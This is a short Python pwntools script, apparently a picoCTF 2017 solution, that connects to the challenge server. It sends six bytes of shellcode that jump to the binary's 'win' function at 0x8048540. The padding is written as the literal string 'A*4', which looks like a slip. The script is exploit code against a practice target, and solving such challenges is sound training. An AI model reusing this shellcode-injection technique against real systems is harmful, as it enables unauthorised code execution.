#!/usr/bin/env python2

from pwn import * 

HOST = 'shell2017.picoctf.com'
PORT = 40976

local = False
#local = True

if local:
    conn = process("./shells")
else:
    conn = remote(HOST, PORT)

elf = ELF("./shells")

context.log_level = 'debug'

if local:
    gdb.attach(conn)

"""
gef)  p win
$1 = {<text variable, no debug info>} 0x8048540 <win>
"""

ex = "\x68\x40\x85\x04\x08\xc3" + "A*4"

print conn.recv(1024)
print conn.recv(1024)

conn.sendline(ex)

print conn.recv(1024)

#conn.interactive()
